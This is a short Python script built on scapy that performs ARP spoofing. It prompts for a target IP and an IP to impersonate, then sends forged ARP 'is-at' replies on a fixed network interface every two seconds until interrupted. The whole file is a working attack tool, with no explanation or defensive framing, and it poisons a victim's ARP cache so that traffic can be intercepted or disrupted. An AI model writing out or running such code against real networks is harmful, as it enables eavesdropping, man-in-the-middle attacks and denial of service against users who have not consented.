
from scapy.all import sendp, ARP, Ether
import time

def get_user_input():
    target_ip = input("Enter the target IP address: ")
    fake_ip = input("Enter the IP address you want to spoof: ")
    return target_ip.strip(), fake_ip.strip()

def main():
    target_ip, fake_ip = get_user_input()

    iface = "enp0s31f6"

    ethernet = Ether()
    arp = ARP(pdst=target_ip, psrc=fake_ip, op="is-at")
    packet = ethernet / arp

    try:
        while True:
            sendp(packet, iface=iface)
            time.sleep(2)  # Sending a packet every 2 seconds to reduce the impact
    except KeyboardInterrupt:
        print("\nARP spoofing stopped.")
main()
